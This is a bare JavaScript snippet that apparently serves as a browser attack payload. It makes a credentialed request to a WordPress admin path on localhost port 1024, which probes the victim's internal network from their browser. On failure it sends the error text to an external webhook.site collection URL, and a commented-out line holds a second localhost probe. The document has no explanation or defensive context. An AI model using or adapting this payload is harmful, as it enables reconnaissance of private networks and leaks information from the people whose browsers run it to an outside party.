try{
  //await fetch("http://localhost:1024/",{mode:'no-cors'});
  var a = await fetch(`https://localhost:1024/wp-admin/`,{"credentials":"include","mode":"cors"});
  
}catch(err){
  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err);
}
